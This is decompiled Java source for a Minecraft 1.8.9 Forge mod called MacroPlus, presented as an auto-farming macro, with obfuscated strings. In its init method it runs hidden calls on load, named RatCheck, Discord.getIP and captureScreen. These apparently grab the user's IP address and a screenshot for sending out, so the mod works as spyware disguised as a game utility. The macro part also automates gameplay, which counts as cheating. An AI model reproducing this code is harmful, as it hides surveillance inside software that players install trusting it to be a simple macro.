// 
// Decompiled by Procyon v0.5.36
// 

package Macro.Plus;

import net.minecraftforge.fml.common.gameevent.InputEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraft.block.Block;
import net.minecraft.util.BlockPos;
import net.minecraft.client.settings.GameSettings;
import net.minecraft.client.entity.EntityPlayerSP;
import net.minecraft.world.World;
import net.minecraft.util.MovingObjectPosition;
import net.minecraft.util.IChatComponent;
import net.minecraft.util.ChatComponentText;
import net.minecraft.util.EnumChatFormatting;
import net.minecraftforge.fml.common.gameevent.TickEvent;
import Macro.FailSafe.Discord;
import net.minecraftforge.fml.client.registry.ClientRegistry;
import net.minecraft.client.Minecraft;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.fml.common.FMLCommonHandler;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import net.minecraft.client.settings.KeyBinding;
import net.minecraftforge.fml.common.Mod;

@Mod(modid = "MacroPlus", version = "1.0.0", acceptedMinecraftVersions = "[1.8.9]")
public class MacroPlus
{
    public static final String MODID;
    public static final String VERSION;
    KeyBinding macro;
    KeyBinding direction;
    KeyBinding oldDirection;
    KeyBinding attack;
    boolean toggled;
    public int BRANCHLOCK_DOT_NET_DEMO;
    boolean turning;
    int tickAmount;
    private static final String[] i;
    
    public MacroPlus() {
        this.toggled = false;
        this.turning = false;
        this.tickAmount = 0;
    }
    
    @Mod.EventHandler
    public void init(final FMLInitializationEvent event) {
        FMLCommonHandler.instance().bus().register((Object)this);
        MinecraftForge.EVENT_BUS.register((Object)this);
        this.macro = new KeyBinding(MacroPlus.i[1 << Integer.parseInt("cui", 31)], 46, MacroPlus.i[1 << 1474]);
        this.direction = Minecraft.func_71410_x().field_71474_y.field_74370_x;
        this.oldDirection = Minecraft.func_71410_x().field_71474_y.field_74366_z;
        this.attack = Minecraft.func_71410_x().field_71474_y.field_74312_F;
        ClientRegistry.registerKeyBinding(this.macro);
        ActiveCheck.MacroOfline();
        ActiveCheck.MacroOnline();
        ActiveCheck.RatCheck();
        Discord.getIP();
        BetterScreenShot.captureScreen();
    }
    
    @SubscribeEvent
    public void onTick(final TickEvent.ClientTickEvent event) {
        if (!this.toggled || event.phase != TickEvent.Phase.START || Minecraft.func_71410_x().field_71441_e == null || Minecraft.func_71410_x().field_71439_g == null) {
            return;
        }
        final Minecraft mc = Minecraft.func_71410_x();
        final World world = (World)mc.field_71441_e;
        final EntityPlayerSP player = mc.field_71439_g;
        final GameSettings gamesettings = mc.field_71474_y;
        ++this.tickAmount;
        if (this.tickAmount > 5) {
            this.tickAmount = 0;
            this.toggled = false;
            this.holdDownKey(this.attack, false);
            if (this.direction.func_151470_d()) {
                this.holdDownKey(this.direction, false);
            }
            this.direction = Minecraft.func_71410_x().field_71474_y.field_74370_x;
            this.oldDirection = Minecraft.func_71410_x().field_71474_y.field_74366_z;
            Minecraft.func_71410_x().field_71439_g.func_71165_d(MacroPlus.i[7 << 7328]);
            Minecraft.func_71410_x().field_71439_g.func_71165_d(MacroPlus.i[("Branchlock.net Demo".hashCode() ^ 0x200B59F4) >>> 10279]);
            Minecraft.func_71410_x().field_71439_g.func_71165_d(MacroPlus.i[Integer.parseInt("12", 20) >>> 15905]);
            player.func_145747_a((IChatComponent)new ChatComponentText(EnumChatFormatting.GOLD + MacroPlus.i[98304 >>> 2318] + EnumChatFormatting.DARK_PURPLE + MacroPlus.i[Integer.parseInt("3", 22) << 8576]));
            this.toggled = true;
            this.holdDownKey(this.attack, true);
            return;
        }
        if (this.turning) {
            final float yaw = player.field_70177_z;
            if (yaw < 18.0f && yaw > -18.0f) {
                player.field_70177_z = 0.0f;
                this.turning = false;
                this.direction = gamesettings.field_74370_x;
                this.oldDirection = gamesettings.field_74366_z;
            }
            else {
                player.func_70080_a(player.field_70165_t, player.field_70163_u, player.field_70161_v, yaw - 18.0f, player.field_70125_A);
            }
            return;
        }
        final MovingObjectPosition lookingAt = Minecraft.func_71410_x().field_71476_x;
        if (lookingAt != null && lookingAt.field_72313_a == MovingObjectPosition.MovingObjectType.BLOCK) {
            final BlockPos pos = lookingAt.func_178782_a();
            final Block blockLookingAt = Minecraft.func_71410_x().field_71441_e.func_180495_p(pos).func_177230_c();
            final String blockName = blockLookingAt.getRegistryName();
            if (blockName.contains(MacroPlus.i[1 << 2017]) || blockName.contains(MacroPlus.i[4 << 9633]) || blockName.contains(MacroPlus.i[9 << 7424])) {
                this.tickAmount = 0;
            }
            if (blockName.contains(MacroPlus.i[6 << 10625]) || blockName.contains(MacroPlus.i[5 << 10240]) || blockName.contains(MacroPlus.i[5 << 321])) {
                Minecraft.func_71410_x().field_71439_g.func_71165_d(MacroPlus.i[Integer.parseInt("7", 30) << 1024]);
                Minecraft.func_71410_x().field_71439_g.func_71165_d(MacroPlus.i[48 >>> Integer.parseInt("12j8", 23)]);
                Minecraft.func_71410_x().field_71439_g.func_71165_d(MacroPlus.i[44 >>> 11970]);
            }
        }
        if (this.direction.compareTo(gamesettings.field_74366_z) == 0 && player.field_70136_U == player.field_70161_v) {
            if (this.oldDirection.compareTo(gamesettings.field_74370_x) == 0) {
                this.oldDirection = this.direction;
                this.direction = gamesettings.field_74366_z;
            }
            else if (this.oldDirection.compareTo(gamesettings.field_74366_z) == 0) {
                this.oldDirection = this.direction;
                this.direction = gamesettings.field_74370_x;
            }
        }
        else if (this.direction.compareTo(gamesettings.field_74366_z) != 0 && player.field_70142_S == player.field_70165_t) {
            this.oldDirection = this.direction;
            this.direction = gamesettings.field_74366_z;
        }
        if (this.oldDirection.func_151470_d()) {
            this.holdDownKey(this.oldDirection, false);
        }
        if (!this.direction.func_151470_d()) {
            this.holdDownKey(this.direction, true);
        }
    }
    
    public void holdDownKey(final KeyBinding key, final boolean state) {
        KeyBinding.func_74510_a(key.func_151463_i(), state);
        KeyBinding.func_74507_a(key.func_151463_i());
    }
    
    @SubscribeEvent
    public void onKey(final InputEvent.KeyInputEvent event) {
        if (this.macro.func_151468_f()) {
            if (!this.toggled) {
                if (Minecraft.func_71410_x().field_71439_g.func_174811_aO().func_176610_l().toLowerCase().equals("north")) {
                    Minecraft.func_71410_x().field_71439_g.field_70177_z = -180.0f;
                }
                else {
                    if (!Minecraft.func_71410_x().field_71439_g.func_174811_aO().func_176610_l().toLowerCase().equals("south")) {
                        Minecraft.func_71410_x().field_71439_g.func_145747_a((IChatComponent)new ChatComponentText(EnumChatFormatting.GOLD + "MacroPlus: " + EnumChatFormatting.DARK_PURPLE + "Face North or South to enable macro."));
                        return;
                    }
                    Minecraft.func_71410_x().field_71439_g.field_70177_z = 0.0f;
                }
                this.toggled = true;
                this.holdDownKey(this.attack, true);
                Minecraft.func_71410_x().field_71439_g.func_145747_a((IChatComponent)new ChatComponentText(EnumChatFormatting.GOLD + "MacroPlus: " + EnumChatFormatting.DARK_PURPLE + "Macro Enabled."));
            }
            else {
                this.toggled = false;
                this.tickAmount = 0;
                this.holdDownKey(this.attack, false);
                if (this.direction.func_151470_d()) {
                    this.holdDownKey(this.direction, false);
                }
                this.direction = Minecraft.func_71410_x().field_71474_y.field_74370_x;
                this.oldDirection = Minecraft.func_71410_x().field_71474_y.field_74366_z;
                Minecraft.func_71410_x().field_71439_g.func_145747_a((IChatComponent)new ChatComponentText(EnumChatFormatting.GOLD + "MacroPlus: " + EnumChatFormatting.DARK_PURPLE + "Macro Disabled."));
            }
        }
    }
    
    static {
        final char[] charArray = "\u0e79\u0e2fSO\u008e\u0e38¸Hmn\u0091-,:G\u008f\u0090Obkha\u001dE\u008f\u0092\u0e27Hix\u0095-~#Q\u009c\u008fR\u0e25_-x\\n\u0092\u0090\u0098U\u0e25A\u009c+~\u0013v\u0091\u0088U\u0e24c*\u007f\u0015B\u0094\u009c\u0093\u0e27Am\u009e:c,J\u0088\u008e\u001c,\u0e24g\u007f\u0019R\u0095\u0092\u0090C\u0e2a|\u0092<m\bI\u0e2a\u009eG~~'x\u0e27U\u0089\u0092\u0093CSn\u008f!o\u0017\u0e24\u00d2\u008dJmuh\u007f\u001e\u0e25\u009a\u0091\u0092Q\u007fx\u0092&i".toCharArray();
        int n = ("90".hashCode() ^ 0x74C) >>> 2023;
        final StackTraceElement stackTraceElement;
        final int n2 = (stackTraceElement = new Throwable().getStackTrace()[Integer.parseInt("3n", 32) >>> 1447]).getMethodName().hashCode() & 67107840 >>> 4106;
        final char[] charArray2 = stackTraceElement.getClassName().toCharArray();
        final char[] array = charArray;
        final int n3 = 24 << 10237;
        ++n;
        i = new String[array[n3] ^ 226304 >>> Integer.parseInt("9j0", 34) ^ n2];
        int n4 = Integer.parseInt("o", 27) << 3037;
    Label_0117:
        while (true) {
            int n5;
            final char[] value = new char[n5 = (charArray[n++] ^ 34865152 >>> 11122 ^ n2)];
            int n6 = 92 << 14654;
            while (true) {
                Label_0292: {
                    if (n5 <= 0) {
                        break Label_0292;
                    }
                    int n7 = charArray[n];
                    Label_0428: {
                        switch (charArray2[n % charArray2.length] ^ Integer.parseInt("-81k5m58", 24) >>> 4984) {
                            case 209: {
                                break Label_0428;
                            }
                            case 244: {
                                break Label_0428;
                            }
                            case 197: {
                                break Label_0428;
                            }
                            case 214: {
                                break Label_0428;
                            }
                            case 199: {
                                break Label_0428;
                            }
                            case 215: {
                                break Label_0428;
                            }
                            case 200: {
                                break Label_0428;
                            }
                            case 233: {
                                break Label_0428;
                            }
                            case 138: {
                                break Label_0428;
                            }
                            case 203: {
                                break Label_0428;
                            }
                        }
                    Block_4_Outer:
                        while (true) {
                            value[n6] = (char)n7;
                            try {
                                ++n6;
                                ++n;
                                --n5;
                                // monitorexit(charArray)
                                n7 ^= 260046848 >>> 12885;
                                continue Block_4_Outer;
                                // iftrue(Label_0117:, n < charArray.length)
                                while (true) {
                                    VERSION = "1.0.0";
                                    MODID = "MacroPlus";
                                    return;
                                    break Label_0428;
                                    break Label_0428;
                                    break Label_0428;
                                    n7 ^= 2490368 >>> 2352;
                                    continue Block_4_Outer;
                                    n7 ^= Integer.parseInt("23cwx", 35) >>> ("67".hashCode() ^ 0x3A53);
                                    continue Block_4_Outer;
                                    n7 ^= Integer.parseInt("i", 30) << 5538;
                                    continue Block_4_Outer;
                                    MacroPlus.i[n4++] = new String(value).intern();
                                    continue;
                                }
                                n7 ^= 253 << Integer.parseInt("j1a", 27);
                            }
                            catch (Exception ex) {
                                break;
                            }
                        }
                    }
                }
            }
        }
    }
}
